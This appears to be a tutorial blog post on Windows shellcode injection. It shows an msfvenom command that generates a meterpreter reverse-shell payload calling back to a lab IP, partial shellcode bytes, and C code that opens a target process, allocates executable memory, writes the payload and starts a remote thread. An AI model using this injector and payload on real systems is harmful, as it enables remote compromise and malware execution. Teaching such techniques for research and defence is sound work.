# Shellcode Injection
## Introduction
Finally, we'll be diving into some actual process injection. More specifically, **shellcode** injection. This is generally seen as the most simple form of process injection. 

## Shellcode
First let's briefly make ourselves familiar with what shellcode is. In this context, shellcode is essentially a string raw unencoded bytes that make up machine instructions. We directly place these bytes into the memory of a process such that it can execute them.  Shellcode is extremely target-specific, as the CPU directly performs the instructions. Writing shellcode by hand is not an option, instead we'll be using `msfvenom` to generate it for us.

Let's see what some shellcode might look like. We generate it by using:

```bash
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.198.128 LPORT=443 -f c --var-name=our_shellcode
```

Which gives us something like this:
```C
unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
[...]
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f";
```

Cool, let's start crafting some source code that performs Process Injection.

>I won't explain every detail of every line of code since that would make this post way too long. For information on how the WIN32 API works and what the different arguments mean, refer to the sources I mentioned in the post about the API.
   
## Getting a handle
Using the WIN32 API we'll start by getting a so-called handle to the target process. This handle is what will identify the process to the API from here on out. To get this handle, we'll need to supply the **Process Identifier (PID)**, which we can find in a task manager and input as an argument.

```C
DWORD dwPID = NULL;
HANDLE hProcess = NULL, hThread = NULL;

if (argc < 2) {
	printf("%s usage: %s <PID>", e, argv[0]);
	return EXIT_FAILURE;
}

dwPID = atoi(argv[1]);
printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
if (hProcess == NULL) {
	return EXIT_FAILURE;
}

```

Notice that we're giving `OpenProcess()` our `dwPID` as an argument, so that we get a handle to the desired process.

## Allocating memory space in the target process
Now that we have a handle to the target process, we can allocate some new memory inside of it. In order to do that we'll need to know how large this space must be. So at this point we'll need our shellcode ready.

```C
unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
[...]
"\xf0\xb5\xa2\x56\xff\xd5";

size_t payloadSize = sizeof(payload);

rBuffer = VirtualAllocEx(
	hProcess,
	NULL,
	payloadSize,
	(MEM_COMMIT | MEM_RESERVE),
	PAGE_EXECUTE_READWRITE
);
```

The `VirtualAllocEx()` function returns the address of the allocated memory, which we call `rBuffer`. This is the address that we'll write our shellcode to. 

## Injecting the shellcode
Here's the important part: Actually writing the shellcode to the newly created memory buffer in the target process' memory. 

```C
WriteProcessMemory(
	hProcess,
	rBuffer,
	payload,
	payloadSize,
	NULL
);
```

We supply the handle to the process, the address of our newly created buffer, the payload and the size of the payload. 

Let's see our work until now in action! As an example I'll use open up the Windows Calculator and use it as our target process, since there won't be any problem if anything goes wrong. 
![Screenshot 2025-03-05 203252](https://github.com/user-attachments/assets/bdf0bf1d-f3d4-4efc-9fe6-bcea934090ac)

We supply our program with the right PID and execute. 
![Screenshot 2025-03-05 203827](https://github.com/user-attachments/assets/ef3f15fc-57f9-4089-aa2d-44c5851764a8)

Immediately we see that we successfully created and wrote to a new memory region in the calculator's process memory. 
![Screenshot 2025-03-05 203912](https://github.com/user-attachments/assets/0eb27a79-cccf-444f-a2f9-cfd1454a0d2f)

The address of that buffer is `0x292c9950000`. Let's open up `x64dbg`, attach it to our calculator process and inspect the memory at this address.
![Screenshot 2025-03-05 204024](https://github.com/user-attachments/assets/88bcf491-e17d-4b3e-89b4-e2e75c4aa7c0)

The shellcode I created starts with `FC 48 83 E4 F0 ...`. And indeed, we find those exact bytes at that specific address in the calculators process memory. We've successfully altered another process' memory!

## Executing the injected shellcode
Now there's only one step left: actually having the process execute the injected code. To do this, we'll create a new thread for that process and point its instruction pointer to our buffer's address. That's really all there is to it.

```C
hThread = CreateRemoteThreadEx(
	hProcess,
	NULL,
	0,
	(LPTHREAD_START_ROUTINE)rBuffer,
	NULL,
	0,
	0,
	&dwTID
);
```

We provide the process handle and the `rBuffer` address and the API returns a handle to the thread. The only other thing worth noting is the cast of `rBuffer` to `LPTHREAD_START_ROUTINE`. This is just how the API function wants to receive `rBuffer` and except for some data alignment stuff, nothing changes.

To make sure we actually see the execution of this shellcode happen, we'll use the following line of code:

```C
WaitForSingleObject(hThread, INFINITE);
```

Quite simply put, the first line waits until the execution of this thread has completed and it waits for an infinite amount of time. 
